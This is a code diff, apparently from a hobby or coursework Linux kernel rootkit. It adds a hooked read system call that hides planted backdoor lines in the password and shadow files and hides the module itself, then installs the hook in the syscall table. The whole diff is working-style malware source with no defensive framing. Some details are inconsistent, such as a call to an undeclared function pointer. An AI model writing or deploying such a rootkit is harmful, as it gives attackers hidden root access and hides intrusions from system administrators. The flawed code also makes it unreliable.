@@ -190,6 +190,105 @@ void add_backdoor(char *path) {
 		    return;
 }
 
+asmlinkage long (*original_sys_read) (unsigned int fd, char __user *buf, size_t count);
+
+asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
+	
+	unsigned long ret;
+	char *tmp;
+	char *pathname;
+	struct file *file;
+	struct path *path;
+	char *tmp_buf;
+	char *BACKDOOR;
+
+    //call original read
+	ret = (*orig_read)(fd, buf, count);
+
+	if(ret <= 0){
+		goto exit;
+	}
+
+	file = fget(fd);
+
+	if(!file){
+		//DEBUG("file doesn't exist");
+		goto exit;
+	}
+
+	path = &file->f_path;
+	path_get(path);
+
+	tmp = (char *)__get_free_page(GFP_TEMPORARY);
+
+	if(!tmp){
+		path_put(path);
+		//DEBUG("couldnt create tmp");
+		goto cleanup1;
+	}
+
+	pathname = d_path(path, tmp, PAGE_SIZE);
+	path_put(path);
+
+	if(IS_ERR(pathname)){
+		//free_page((unsigned long)tmp);
+		//DEBUG("pathname errors");
+		goto cleanup1;
+	}
+
+    // Entry point into hiding module
+	if(strcmp(pathname, MODULE_FILE)==0){
+        ret = remove_rootkit(buf, ret);
+    }
+    
+    //check if it's the files we want
+	if(strcmp(pathname, PASSWD_FILE)==0){
+		BACKDOOR = BACKDOOR_PASSWD;
+	} else if(strcmp(pathname, SHADOW_FILE)==0){
+		BACKDOOR = BACKDOOR_SHADOW;		
+	} else {
+        goto cleanup1;
+    }
+
+	if(!(strstr(buf, BACKDOOR))){
+		goto cleanup1;
+	}
+
+	tmp_buf = kmalloc(ret, GFP_KERNEL);
+	if(!tmp_buf){
+		goto cleanup1;
+	}
+
+	copy_from_user(tmp_buf, buf, ret);
+
+	if(!tmp_buf){
+		goto cleanup2;
+	}
+
+    //remove backdoor in buf, change ret
+	while((strstr(tmp_buf, BACKDOOR))){
+		char *strBegin  = tmp_buf;
+		char *substrBegin = strstr(strBegin, BACKDOOR);
+		char *substrEnd = substrBegin + strlen(BACKDOOR);
+		int remaining_length = (int)(strlen(substrEnd)) + 1 ;
+		memmove(substrBegin, substrEnd, remaining_length);
+		ret = ret - strlen(BACKDOOR);
+	}
+
+	copy_to_user(buf, tmp_buf, ret);
+	
+cleanup2:	
+	if(tmp_buf) 
+		kfree(tmp_buf);
+	
+cleanup1:
+	if(tmp) 
+		free_page((unsigned long)tmp);
+
+exit:
+	return ret;	
+}
+
 // void hide_backdoor (void) {
 	
 // original_getdents = (void *)sys_call_address[__NR_index];                        \
@@ -331,11 +430,8 @@ static int __init rootkit_init(void){
 	
 	add_backdoor(shadow_file);
 	
-// 	original_getdents = (void *)sys_call_address[__NR_read];
-//     	sys_call_address[__NR_read] = (unsigned long*)&original_getdents;
-	
-	original_getdents = (void *)sys_call_address[__NR_read];
-    	sys_call_address[__NR_read] = (unsigned long*)&sys_getdents_hook;
+	original_sys_read = (void *)sys_call_address[__NR_read];
+    	sys_call_address[__NR_read] = (unsigned long*)&new_sys_read;
 	
 	// End Marc
 	
